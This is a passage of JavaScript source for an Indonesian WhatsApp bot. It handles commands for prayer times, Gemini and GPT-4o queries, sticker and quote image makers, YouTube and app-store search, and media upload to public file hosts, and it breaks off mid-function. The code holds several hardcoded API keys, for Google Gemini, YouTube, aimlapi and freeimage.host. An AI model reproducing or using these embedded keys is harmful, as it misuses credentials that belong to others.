                        subuh: $(tds[2]).text().trim(),
                        terbit: $(tds[3]).text().trim(),
                        dhuha: $(tds[4]).text().trim(),
                        dzuhur: $(tds[5]).text().trim(),
                        ashar: $(tds[6]).text().trim(),
                        maghrib: $(tds[7]).text().trim(),
                        isya: $(tds[8]).text().trim()
                    });
                }
            });
            return jadwal.length > 0 ? jadwal : null;
        } catch (error) {
            console.error("Error getJadwalSholat:", error.message);
            return null;
        }
    }
    (async () => {
        let kodeWilayah = await getKodeWilayah(q);
        if (!kodeWilayah) return m.reply("Kota tidak ditemukan, coba masukkan nama kota yang tepat.");
        let jadwal = await getJadwalSholat(kodeWilayah);
        if (!jadwal) return m.reply("Gagal mengambil jadwal salat.");
        let today = moment().tz("Asia/Jakarta").date(); // Mengambil hari (1-31)
        let todayJadwal = jadwal.find(j => parseInt(j.tanggal) === today);
        if (!todayJadwal) return m.reply("Jadwal untuk hari ini tidak ditemukan.");
        let hasil = `*✨ Jadwal Salat ${q.charAt(0).toUpperCase() + q.slice(1)} (Tanggal ${todayJadwal.tanggal})* ✨\n\n` +
                    `🌙 *Imsak:* ${todayJadwal.imsyak}\n` +
                    `🕌 *Subuh:* ${todayJadwal.subuh}\n` +
                    `🌄 *Terbit:* ${todayJadwal.terbit}\n` +
                    `☀️ *Dhuha:* ${todayJadwal.dhuha}\n` +
                    `🕛 *Dzuhur:* ${todayJadwal.dzuhur}\n` +
                    `🕒 *Ashar:* ${todayJadwal.ashar}\n` +
                    `🌇 *Maghrib:* ${todayJadwal.maghrib}\n` +
                    `🌃 *Isya:* ${todayJadwal.isya}`;
        m.reply(hasil);
    })();
}
    break

case "gemini": case ",": {
    try {
        let prompt;
        if (m.quoted) {
            prompt = m.quoted.text;
        } else if (text) {
            prompt = text;
        } else {
            return m.reply("Silakan berikan pertanyaan atau reply pesan yang ingin dijawab");
        }

        await m.reply(mess.wait);
        
        const payload = {
            contents: [{
                parts: [{
                    text: prompt
                }]
            }],
            generationConfig: {
                temperature: 0.7,
                maxOutputTokens: 1024
            }
        };

        const response = await fetch("https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        let result;

        if (data.candidates?.[0]?.content?.parts?.[0]?.text) {
            result = data.candidates[0].content.parts[0].text;
        } else {
            result = "Maaf, tidak dapat memproses permintaan saat ini.";
        }

        if (prompt.length > 100) {
            const promptSummary = prompt.substring(0, 100) + "...";
            await m.reply(`Question: ${promptSummary}\n\nAnswer: ${result}`);
        } else {
            await m.reply(result);
        }

    } catch (error) {
        console.error(error);
        await m.reply("Terjadi kesalahan saat mengakses Gemini API. Silakan coba lagi nanti.");
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "brat": {
 if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);
 const safeText = typeof text === 'string' ? text : String(text || '');
 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);
 try {
   await conn.sendMessage(m.chat, {
     text: `Yuk pilih tipe *brat* yang Kamu suka dari menu di bawah ini ya, kak!`,
     footer: '',
     buttons: [
       {
         buttonId: `${prefix}owner`,
         buttonText: { displayText: '☎️ Hubungi Owner' },
         type: 1
       },
       {
         buttonId: 'action',
         buttonText: { displayText: '🖼️ Pilih Tipe Brat' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: 'Pilih Tipe Brat',
             sections: [
               {
                 title: 'Tipe Gambar',
                 rows: [
                   { title: 'Gambar', description: 'Versi gambar biasa', id: `${prefix}bratgambar ${safeText}` },
                   { title: 'Gambar V2', description: 'Versi gambar kedua', id: `${prefix}bratimg2 ${safeText}` },
                   { title: 'Gambar V3', description: 'Versi gambar ketiga', id: `${prefix}bratimg3 ${safeText}` }
                 ]
               },
               {
                 title: 'Tipe Video',
                 rows: [
                   { title: 'Video', description: 'Versi video/sticker bergerak', id: `${prefix}bratvid ${safeText}` }
                 ]
               }
             ]
           })
         }
       }
     ],
     headerType: 4,
     viewOnce: true,
     contextInfo: {
       isForwarded: false,
       mentionedJid: [m.sender]
     }
   }, { quoted: m });
 } catch (error) {
   console.error('Error in brat command:', error);
   m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');
 }
}
break

case "bratgambar": case "bratimg":  {
if (!text) return m.reply(example('teksnya'))
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "bratgambar2": case "bratimg2": {
  if (!text) {
    const colorList = `
*Daftar Kode Warna Umum*

*Dasar:*
• Hitam: #000000
• Putih: #FFFFFF
• Merah: #FF0000
• Hijau: #00FF00
• Biru: #0000FF
• Kuning: #FFFF00
• Cyan: #00FFFF
• Magenta: #FF00FF

*Lainnya:*
• Abu: #808080
• Navy: #000080
• Orange: #FFA500
• Pink: #FFC0CB
• Emas: #FFD700

Format: 
*bratimg2 teks | fontColor | bgColor*
Contoh:
bratimg2 Halo World | #FF0000 | #FFFFFF
`.trim();
    return m.reply(colorList);
  }
  const axios = require('axios');
  const [teks, fontColor, bgColor] = text.split("|").map(v => v?.trim());
  const finalText = teks || 'Yubi 😗😗';
  const finalFontColor = fontColor || '#000000';
  const finalBgColor = bgColor || '#FFFFFF';
  const apiUrl = `https://fastrestapis.fasturl.cloud/maker/brat/advanced?text=${encodeURIComponent(finalText)}&font=Arial&fontSize=auto&fontPosition=justify&fontBlur=3&fontColor=${encodeURIComponent(finalFontColor)}&bgColor=${encodeURIComponent(finalBgColor)}`;

  try {
    let response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    let buffer = response.data;
    await conn.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
  } catch (err) {
    console.error("Error bratimg2:", err);
    m.reply('Gagal membuat sticker. Coba lagi nanti.');
  }
}
break

case 'bratimg3': case 'bratgambar3':  {
    const axios = require('axios');
    if (!text) {
        return m.reply(`*Format:*\nbratimg3 teks|tema\n\n*Contoh:*\nbratimg3 Biyu|black\n\n*List tema yang tersedia:*\n- white \n- black\n- green\n- blue\n- strike`);
    }
    let [teks, tema] = text.split('|');
    teks = teks?.trim();
    tema = tema?.trim()?.toLowerCase();
    let temaValid = ['white', 'black', 'green', 'blue', 'strike'];
    if (!temaValid.includes(tema)) tema = 'white';
    if (!teks) {
        return m.reply(`*Format salah!*\nContoh: bratimg3 halo dunia|black\n\n*List tema:*\n- white \n- black\n- green\n- blue\n- strike`);
    }
    let url = `https://api.nekorinn.my.id/maker/brat?text=${encodeURIComponent(teks)}&theme=${tema}`;
    try {
        let response = await axios.get(url, { responseType: "arraybuffer" });
        let buffer = response.data;
        await conn.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
    } catch (e) {
        console.error(e);
        m.reply('Gagal mengambil data dari API. Coba lagi nanti.');
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":
case "bratvideo": {
  if (!text) return m.reply(example('teksnya'));
  try {
    const axios = require('axios');
    const { tmpdir } = require('os');
    const { join } = require('path');
    const fs = require('fs');
    const { spawn } = require('child_process');
    const videoUrl = `https://fastrestapis.fasturl.cloud/maker/brat/animated?text=${encodeURIComponent(text)}&mode=animated`;
    const res = await axios.get(videoUrl, { responseType: 'arraybuffer' });
    const tmpMp4 = join(tmpdir(), `brat-${Date.now()}.mp4`);
    const tmpWebp = join(tmpdir(), `brat-${Date.now()}.webp`);
    fs.writeFileSync(tmpMp4, res.data);
    await new Promise((resolve, reject) => {
      const ffmpeg = spawn('ffmpeg', [
        '-i', tmpMp4,
        '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,fps=15',
        '-loop', '0',
        '-ss', '0',
        '-t', '6',
        '-an',
        '-vsync', '0',
        '-s', '512x512',
        '-f', 'webp',
        tmpWebp
      ]);
      ffmpeg.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error('FFmpeg failed with code ' + code));
      });
    });
    const stickerBuffer = fs.readFileSync(tmpWebp);
    await conn.sendMessage(m.chat, {
      sticker: stickerBuffer,
      packname: global.packname,
      author: global.author,
    }, { quoted: m });
    fs.unlinkSync(tmpMp4);
    fs.unlinkSync(tmpWebp);
  } catch (err) {
    console.error("Error:", err);
    m.reply('Gagal bikin sticker animasi. Coba lagi nanti.');
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'playstore': {
if (!text) return m.reply(`${prefix + command} WhatsApp`)
m.reply('Proses..')
await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.nama}\n`
teks += `*◦ Developer :* ${i.developer}\n`
teks += `*◦ Rating :* ${i.rate}\n`
teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error 🗿'))
}
break

case 'appstore': case 'appstr': {
if (!text) return m.reply(`${prefix + command} WhatsApp`)
m.reply('Proses ...')
await fetch(`https://api.diioffc.web.id/api/search/appstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 Hasil Pencarian APP STORE*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.title}\n`
teks += `*◦ Description :* ${i.description}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error :('))
}
break
//=================================//
case 'yt':
case 'youtube': {
  const axios = require('axios');
  if (!text) return m.reply(`Contoh penggunaan:
• yt search lofi
• yt channel lofi girl
• yt latest lofi girl
• yt stat https://youtube.com/watch?v=abc123`);

  const subcmd = text.split(' ')[0].toLowerCase();
  const query = text.replace(subcmd, '').trim();
  const apikey = 'AIzaSyBI6P58kEwxWywxh_UeCUpQC7_T5xwieTg';

  if (!['search', 'channel', 'latest', 'stat'].includes(subcmd))
    return m.reply('Subfitur tidak dikenal. Gunakan salah satu: search, channel, latest, stat');

  try {
    if (subcmd === 'search') {
      if (!query) return m.reply('Contoh: yt search lofi chill');
      const { data } = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
        params: {
          part: 'snippet',
          q: query,
          key: apikey,
          type: 'video',
          maxResults: 30 // lu atur aj bebas
        }
      });

      if (!data.items.length) return m.reply('Video tidak ditemukan.');
      let teks = '*Hasil Pencarian YouTube:*\n\n';
      data.items.forEach(v => {
        teks += `• *${v.snippet.title}*\n`;
        teks += `  Channel: ${v.snippet.channelTitle}\n`;
        teks += `  Link: https://youtube.com/watch?v=${v.id.videoId}\n\n`;
      });
      return m.reply(teks);
    }

    if (subcmd === 'channel') {
      if (!query) return m.reply('Contoh: yt channel lofi girl');
      const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
        params: {
          part: 'snippet',
          q: query,
          type: 'channel',
          key: apikey
        }
      });

      const ch = search.data.items[0];
      if (!ch) return m.reply('Channel tidak ditemukan.');
      const channelId = ch.id.channelId;
      const detail = await axios.get(`https://www.googleapis.com/youtube/v3/channels`, {
        params: {
          part: 'snippet,statistics,brandingSettings',
          id: channelId,
          key: apikey
        }
      });

      const info = detail.data.items[0];
      if (!info) return m.reply('Gagal mengambil detail channel.');
      const bannerUrl = info.brandingSettings?.image?.bannerExternalUrl;
      const cap = `*Channel Info:*
• *Nama:* ${info.snippet.title}
• *Subscriber:* ${info.statistics.subscriberCount}
• *Views:* ${info.statistics.viewCount}
• *Total Video:* ${info.statistics.videoCount}
• *Dibuat:* ${new Date(info.snippet.publishedAt).toLocaleDateString()}
• *Lokasi:* ${info.snippet.country || 'Tidak diketahui'}
• *Link:* https://youtube.com/channel/${channelId}

*Deskripsi:*\n${info.snippet.description?.slice(0, 500) || 'Tidak ada deskripsi.'}`;

      await conn.sendMessage(m.chat, {
        image: { url: info.snippet.thumbnails.high.url },
        caption: cap
      }, { quoted: m });

      if (bannerUrl) await conn.sendMessage(m.chat, {
        image: { url: bannerUrl },
        caption: 'Banner Channel'
      }, { quoted: m });
      return;
    }

    if (subcmd === 'latest') {
      if (!query) return m.reply('Contoh: yt latest lofi girl');
      const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
        params: {
          part: 'snippet',
          q: query,
          type: 'channel',
          key: apikey
        }
      });

      const ch = search.data.items[0];
      if (!ch) return m.reply('Channel tidak ditemukan.');
      const channelId = ch.id.channelId;
      const latest = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
        params: {
          key: apikey,
          channelId,
          part: 'snippet,id',
          order: 'date',
          maxResults: 1
        }
      });

      const vid = latest.data.items[0];
      if (!vid) return m.reply('Video terbaru tidak ditemukan.');
      const caption = `*Video Terbaru dari ${vid.snippet.channelTitle}:*
• *Judul:* ${vid.snippet.title}
• *Link:* https://youtube.com/watch?v=${vid.id.videoId}`;

      return conn.sendMessage(m.chat, {
        image: { url: vid.snippet.thumbnails.high.url },
        caption
      }, { quoted: m });
    }

    if (subcmd === 'stat') {
      if (!query.includes('youtube.com/watch')) return m.reply('Contoh: yt stat https://youtube.com/watch?v=abc123');
      const videoId = new URL(query).searchParams.get('v');
      const res = await axios.get(`https://www.googleapis.com/youtube/v3/videos`, {
        params: {
          part: 'snippet,statistics,status,contentDetails',
          id: videoId,
          key: apikey
        }
      });

      const video = res.data.items[0];
      if (!video) return m.reply('Video tidak ditemukan.');
      const cap = `*Statistik Video:*
• *Judul:* ${video.snippet.title}
• *Channel:* ${video.snippet.channelTitle}
• *Tayang:* ${new Date(video.snippet.publishedAt).toLocaleDateString()}
• *Views:* ${video.statistics.viewCount}
• *Likes:* ${video.statistics.likeCount}
• *Komentar:* ${video.statistics.commentCount}
• *Kategori ID:* ${video.snippet.categoryId}
• *Status:* ${video.status.privacyStatus}
• *Lisensi:* ${video.status.license}
• *Tags:* ${video.snippet.tags?.slice(0, 5).join(', ') || 'Tidak ada tag'}
• *Link:* https://youtube.com/watch?v=${videoId}

*Deskripsi:* 
${video.snippet.description?.slice(0, 1000) || 'Tidak ada deskripsi.'}`;
      return m.reply(cap);
    }
  } catch (err) {
    console.error(err);
    return m.reply('Gagal mengambil data dari YouTube. Coba lagi nanti.');
  }
}
break

case "cekbaterai": {
    try {
        
        const batteryData = await si.battery();
        
        if (!batteryData.hasBattery) {
            m.reply('Tidak dapat mendeteksi baterai pada sistem.');
            break;
        }

        const level = Math.floor(batteryData.percent);
        const isCharging = batteryData.isCharging;
        const timeRemaining = batteryData.timeRemaining;
        
        let message = `🔋 *Status Baterai*\n\n`;
        message += `📊 Level: ${level}%\n`;
        message += `⚡ Status: ${isCharging ? 'Sedang charging' : 'Tidak charging'}\n`;
        
        
        if (timeRemaining > 0) {
            const hours = Math.floor(timeRemaining / 60);
            const minutes = timeRemaining % 60;
            message += `⏳ ${isCharging ? 'Waktu sampai penuh' : 'Sisa waktu'}: ${hours}j ${minutes}m\n`;
        }

        message += '\n';
        
       
        if (level <= 20) {
            message += '⚠️ *Peringatan:* Baterai lemah, segera charge!';
        } else if (level >= 80 && isCharging) {
            message += '✅ *Info:* Baterai sudah hampir penuh.';
        }

        m.reply(message);
    } catch (error) {
        m.reply(`❌ Terjadi error: ${error.message}`);
        console.error('Battery check error:', error);
    }}
    break
    
    case "qc": {
 if (!text) return m.reply(example(
 `*Format:* qc teks | #kodewarna\n\n` +
 `*Contoh Penggunaan:*\n` +
 `*qc Halo | #FF0000* \n` +
 `*Daftar Warna:*\n` +
 `*Hitam* → #000000\n` +
 `*Putih (Default)* → #FFFFFF\n` +
 `*Merah* → #FF0000\n` +
 `*Hijau* → #00FF00\n` +
 `*Biru* → #0000FF\n` +
 `*Kuning* → #FFFF00\n` +
 `*Cyan (Biru Muda)* → #00FFFF\n` +
 `*Magenta (Ungu Pink)* → #FF00FF\n` +
 `*Abu-Abu* → #808080\n` +
 `*Coklat* → #8B4513\n` +
 `*Oranye* → #FFA500\n` +
 `*Pink* → #FFC0CB\n` +
 `*Ungu* → #800080\n` +
 `*Biru Tua* → #00008B\n` +
 `*Hijau Tua* → #006400\n` +
 `*Merah Gelap* → #8B0000`
 ));
 let warna = "#FFFFFF"; 
 let teks = text;
 if (text.includes("|")) {
 let splitText = text.split("|").map(t => t.trim());
 teks = splitText[0];
 let warnaInput = splitText[1];
 if (/^#([0-9A-F]{6})$/i.test(warnaInput)) {
 warna = warnaInput;
 }
 }
 var ppuser;
 try {
 ppuser = await conn.profilePictureUrl(m.sender, 'image');
 } catch (err) {
 ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg';
 }
 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": warna,
 "width": 812,
 "height": 968,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": m.pushName,
 "photo": {
 "url": ppuser
 }
 },
 "text": teks,
 "replyMessage": {}
 }
 ]
 };
 const axios = require('axios');
 axios.post('https://bot.lyo.su/quote/generate', json, {
 headers: {'Content-Type': 'application/json'}
 }).then(async (res) => {
 const buffer = Buffer.from(res.data.result.image, 'base64');
 let tempnya = "./library/database/sampah/" + m.sender + ".png";
 await fs.writeFile(tempnya, buffer, async (err) => {
 if (err) return m.reply("Error");
 await conn.sendAsSticker(m.chat, tempnya, m, { packname: global.packname });
 await fs.unlinkSync(`${tempnya}`);
 });
 }).catch(err => {
 m.reply("Gagal membuat quote, coba lagi!");
 });
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "nulis": case "tulis": {
  if (!text) return m.reply('❌ Masukkan teks yang ingin ditulis.\n\nExample: nulis Biyu Tamvan');
  m.reply(mess.wait);
  const axios = require('axios');
  let apiUrl = `https://nirkyy.koyeb.app/api/v1/nulis?text=${encodeURIComponent(text)}`;
  try {
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: `📝 *Hasil Tulisan* 📝\n\n📌 *Teks:* ${text}`
    }, { quoted: m });
  } catch (error) {
    console.log(error);
    m.reply(`❌ Error\nLogs error : ${error.message}`);
  }
}
break

case 'texttonote': {
  if (!text) return m.reply('Contoh:\ntexttonote Nama|Kelas|Mata Pelajaran|Tanggal|Isi Catatan')
  let [name, classroom, subject, date, ...content] = text.split('|')
  if (!name || !classroom || !subject || !date || content.length == 0) {
    return m.reply('Format salah!\nContoh:\ntexttonote Biyu|XII - Bio A|Sexual Organs|2025-01-25|Isi catatan...')
  }

  let contentEncoded = encodeURIComponent(content.join('|').trim())
  let url = `https://fastrestapis.fasturl.cloud/tool/texttonote?name=${encodeURIComponent(name)}&classroom=${encodeURIComponent(classroom)}&subject=${encodeURIComponent(subject)}&date=${encodeURIComponent(date)}&content=${contentEncoded}`

  try {
    await conn.sendMessage(m.chat, {
      image: { url },
      caption: `Catatan untuk ${subject} berhasil dibuat!`
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    m.reply('Gagal membuat catatan, pastikan format dan isi valid.')
  }
}
  break
  
case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
     if (!text.includes(',')) return m.reply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
 
 let [from, to] = text.split(',').map(v => v.trim());
 let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
      try {
 let response = await fetch(biyumaunyepong);
 let data = await response.json();
 if (data.status !== 200) return m.reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
    let result = data.result;
    let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
    m.reply(msg);
 } catch (e) {
 console.error(e);
 m.reply('Terjadi kesalahan saat mengambil data!');
    }
 break
 
case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'opentime': {
    if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
    if (!argsbiyuoffc[0] || isNaN(argsbiyuoffc[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = argsbiyuoffc[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(argsbiyuoffc[0]) * timeUnits[unit]
    m.reply(`Open time ${argsbiyuoffc[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            conn.groupSettingUpdate(m.chat, 'not_announcement')
            m.reply('*Tepat waktu* grup dibuka oleh admin\nsekarang member dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat membuka grup')
            console.log(err)
        }
    }, timer)
}
    break

case 'closetime': {
    if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
    if (!m.isBotAdmin) return m.reply(mess.botAdmin)
    if (!argsbiyuoffc[0] || isNaN(argsbiyuoffc[0])) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    
    const timeUnits = {
        'detik': 1000,
        'menit': 60000,
        'jam': 3600000,
        'hari': 86400000
    }
    const unit = argsbiyuoffc[1]?.toLowerCase()
    if (!timeUnits[unit]) return m.reply('• Format waktu: detik, menit, jam, hari\n• Contoh: 10 detik')
    const timer = parseInt(argsbiyuoffc[0]) * timeUnits[unit]
    m.reply(`Close time ${argsbiyuoffc[0]} ${unit} dimulai dari sekarang`)
    setTimeout(() => {
        try {
            conn.groupSettingUpdate(m.chat, 'announcement')
            m.reply('*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan')
        } catch (err) {
            m.reply('Terjadi kesalahan saat menutup grup')
            console.log(err)
        }
    }, timer)
}
    break
    
case 'quotes': case 'kata²': case 'kata-kata': case 'kata"': {
if (!argsbiyuoffc[0]) return m.reply("Masukkan kata kunci, contoh: *quotes hari ini*");

const cheerio = require('cheerio');
  async function squotes(input) {
    return new Promise((resolve, reject) => {
      fetch('https://jagokata.com/kata-bijak/kata-' + input.replace(/\s/g, '_') + '.html?page=1')
        .then(res => res.text())
        .then(res => {
          const $ = cheerio.load(res)
          let data = []
          $('div[id="main"]').find('ul[id="citatenrijen"] > li').each(function (index, element) {
            let x = $(this).find('div[class="citatenlijst-auteur"] > a').text().trim()
            let y = $(this).find('span[class="auteur-beschrijving"]').text().trim()
            let z = $(element).find('q[class="fbquote"]').text().trim()
            data.push({ author: x, bio: y, quote: z })
          })
          data.splice(2, 1)
          if (data.length == 0) return resolve({ creator: "Wudysoft", status: false })
          resolve({ creator: "Fruatre", status: true, data })
        }).catch(reject)
    })
  }

  squotes(argsbiyuoffc[0]).then(res => {
    if (res.status) {
      let teks = ''
      res.data.forEach(function (item, index) {
        teks += `*${item.quote}*\n- ${item.author}, ${item.bio}\n\n`
      })
      m.reply(teks)
    } else {
      m.reply('Tidak ada kutipan yang ditemukan.')
    }
  })
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'openaivision':
case 'aiimg': {
  if (!text) return m.reply('Masukkan prompt teks!\nContoh: .openaivision gambar apa ini?')
  let qmsg = m.quoted ? m.quoted : m
  let mime = qmsg?.mimetype || qmsg?.msg?.mimetype || ''
  if (!mime.includes('image')) return m.reply('Kirim atau reply gambar dengan caption!\nContoh: .openaivision gambar apa ini?')
  await conn.sendMessage(m.chat, { react: { text: '🧸', key: m.key } })
  let mediaPath = await conn.downloadAndSaveMediaMessage(qmsg)
  if (!mediaPath) return m.reply('Gagal mengunduh gambar.')

  try {
    const { ImageUploadService } = require('node-upload-images')
    const fs = require('fs')
    const axios = require('axios')
    const service = new ImageUploadService('pixhost.to')
    const { directLink } = await service.uploadFromBinary(fs.readFileSync(mediaPath), 'vision.jpg')
    const apiKeyList = [
      '662413cf9b2e4a09b8175abf38853f1c',
      'e7956e69c5634672982005bde27e9223',
      '077cf44364ac4c32b8263482ef4371f1',
      '53f034d6af90448eb08b9fd57306ca15',
      '99fca1d1f66c49f19ff5d62a06c5469c',
      'ac21b13204694f70b66ba9241cbb1af1',
      '5cdd70a6fb774a598dec30f739aa7532',
      '002c22a49f5b44aa833a84d5953b48fe',
      '271124eea23d48608c5eabfee5b670ae',
      '662413cf9b2e4a09b8175abf38853f1c'
    ]
    const pickRandom = list => list[Math.floor(Math.random() * list.length)]
    let res = await axios.post('https://api.aimlapi.com/chat/completions', {
      model: 'gpt-4o',
      messages: [
        {
          role: 'user',
          content: [
            { type: 'text', text: text },
            { type: 'image_url', image_url: { url: directLink } }
          ]
        }
      ],
      max_tokens: 300
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + pickRandom(apiKeyList)
      }
    })
    let replyText = res.data.choices[0].message.content
    await m.reply(replyText)
  } catch (e) {
    console.error(e)
    m.reply('Gagal proses gambar. Coba lagi nanti.')
  } finally {
    if (mediaPath) require('fs').unlinkSync(mediaPath)
  }
}
break
case 'tourl': {
    const fs = require('fs');
    const path = require('path');
    const axios = require('axios');
    const FormData = require('form-data');
    const fetch = require('node-fetch');
    const { fromBuffer } = require('file-type');
    const { ImageUploadService } = require('node-upload-images');
    const q = m.quoted || m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!mimetype) return m.reply(`Kirim atau reply media dengan caption *${prefix + command}*`);
    const media = await q.download?.();
    if (!media) return m.reply('Gagal mengunduh media.');
    const fileSizeInBytes = media.length;
    const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
    const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
    const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
    const tempDir = './temp';
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
    const filePath = path.join(tempDir, `tourl_${Date.now()}`);
    fs.writeFileSync(filePath, media);
    await conn.sendMessage(m.chat, {
        react: { text: '⏳', key: m.key }
    });

    async function uploadToSupa(buffer) {
        try {
            const form = new FormData();
            form.append('file', buffer, 'upload.jpg');
            const res = await axios.post('https://i.supa.codes/api/upload', form, {
                headers: form.getHeaders()
            });
            return res.data?.link || null;
        } catch (e) {
            console.error('Supa:', e.message);
            return null;
        }
    }

    async function uploadToTmpFiles(filePath) {
        try {
            const buffer = fs.readFileSync(filePath);
            const { ext, mime } = await fromBuffer(buffer);
            const form = new FormData();
            form.append('file', buffer, {
                filename: `${Date.now()}.${ext}`,
                contentType: mime
            });
            const res = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
                headers: form.getHeaders()
            });
            return res.data.data.url.replace('s.org/', 's.org/dl/');
        } catch (e) {
            console.error('TmpFiles:', e.message);
            return null;
        }
    }

    async function uploadToUguu(filePath) {
        try {
            const form = new FormData();
            form.append('files[]', fs.createReadStream(filePath));
            const res = await axios.post('https://uguu.se/upload.php', form, {
                headers: form.getHeaders()
            });
            return res.data.files?.[0]?.url || null;
        } catch (e) {
            console.error('Uguu:', e.message);
            return null;
        }
    }

    async function uploadToFreeImageHost(buffer) {
        try {
            const form = new FormData();
            form.append('source', buffer, 'file');
            const res = await axios.post('https://freeimage.host/api/1/upload', form, {
                params: { key: '6d207e02198a847aa98d0a2a901485a5' },
                headers: form.getHeaders()
            });
            return res.data.image.url;
        } catch (e) {
            console.error('FreeImage:', e.message);
            return null;
        }
    }

    async function uploadToCatbox(media, mimetype) {
        try {
            let ext = mimetype.split('/')[1] || '';
            if (ext) ext = `.${ext}`;
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', media, `file${ext}`);
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            return result.trim();
        } catch (e) {
            console.error('Catbox:', e.message);
            return null;
        }
    }

    async function uploadToPixhost(media) {
        try {
